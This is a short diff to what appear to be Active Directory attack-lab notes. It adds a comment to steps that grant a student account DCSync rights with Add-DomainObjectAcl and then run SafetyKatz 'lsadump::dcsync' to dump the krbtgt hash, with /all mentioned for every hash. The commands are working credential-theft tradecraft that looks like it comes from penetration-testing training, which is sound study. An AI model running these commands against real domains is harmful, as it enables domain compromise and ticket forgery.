@@ -7,6 +7,7 @@
   2.1-  Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student575 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
   2.2-  Run command 2 again
 3-  Run DCSync attack:
+  # CAN SPECIFY /ALL TO GET ALL HASHES
   C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
   We now get the NTLM or aes256 of the krbtgt acc.
   
